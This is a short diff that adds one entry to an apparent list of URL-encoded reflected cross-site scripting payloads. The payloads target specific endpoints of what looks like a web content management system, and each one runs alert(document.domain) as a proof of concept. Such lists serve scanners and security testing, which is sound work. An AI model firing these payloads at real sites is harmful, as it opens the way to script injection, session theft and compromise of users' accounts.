@@ -5,3 +5,4 @@
 /api/module?type=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&live_edit=true&from_url=test
 /search.php?keywords=ABC%3Cdiv%20style=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
 /editor_tools/rte_image_editor?types=%27;});alert(document.domain);$(picker).on(%27Noodles%27,%20function(result)%20{%20var%20XSS=%27
+/editor_tools/module?type=%22%3E%3Cdiv%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
